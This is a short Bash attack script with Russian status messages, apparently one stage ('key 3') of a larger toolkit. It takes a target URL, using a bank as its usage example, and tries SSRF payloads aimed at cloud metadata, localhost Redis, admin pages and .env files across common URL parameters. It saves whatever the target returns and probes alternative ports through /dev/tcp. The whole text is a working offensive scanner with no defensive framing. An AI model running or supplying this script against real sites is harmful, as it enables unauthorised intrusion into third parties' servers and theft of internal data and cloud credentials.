#!/bin/bash
TARGET=$1
[ -z "$TARGET" ] && { echo "Usage: $0 https://bank.com"; exit 1; }
DOMAIN=$(echo "$TARGET" | sed 's|https\?://||;s|/.*||')
KEY3_DIR="$HOME/.shadow_keys/$DOMAIN/key3_gate"
mkdir -p "$KEY3_DIR"

echo "[КЛЮЧ 3] 🚪 Ищу открытые ворота..."

# SSRF векторы
SSRF_PAYLOADS=(
    "http://127.0.0.1:8080/admin"
    "http://127.0.0.1:6379/"
    "http://169.254.169.254/latest/meta-data/"
    "http://localhost/.env"
    "http://10.0.0.1/"
)

SSRF_PARAMS=("url" "redirect" "callback" "webhook" "proxy" "target" "fetch" "src" "path" "next")

for param in "${SSRF_PARAMS[@]}"; do
    for ssrf in "${SSRF_PAYLOADS[@]}"; do
        code=$(curl -sk --max-time 3 -L "$TARGET?$param=$ssrf" -o "$KEY3_DIR/ssrf_${param}_$(echo $ssrf | tr '/:' '_').txt" -w "%{http_code}" 2>/dev/null)
        [ "$code" = "200" ] && echo "  💀 SSRF НАЙДЕН: ?$param=$ssrf (HTTP 200)" && echo "$param|$ssrf" >> "$KEY3_DIR/ssrf_found.txt"
    done
done

# Альтернативные порты
ALT_PORTS="8080 8443 3000 5000 8000 8888 9090 9443 10443"
for port in $ALT_PORTS; do
    timeout 2 bash -c "echo >/dev/tcp/$DOMAIN/$port" 2>/dev/null && {
        echo "  💀 ПОРТ $port ОТКРЫТ"
        echo "$port" >> "$KEY3_DIR/open_ports.txt"
    }
done

SSRF_FOUND=$(wc -l < "$KEY3_DIR/ssrf_found.txt" 2>/dev/null || echo 0)
PORTS_FOUND=$(wc -l < "$KEY3_DIR/open_ports.txt" 2>/dev/null || echo 0)
echo "[КЛЮЧ 3] ✅ SSRF: $SSRF_FOUND | Портов: $PORTS_FOUND"
echo "[КЛЮЧ 3] 📁 $KEY3_DIR/"
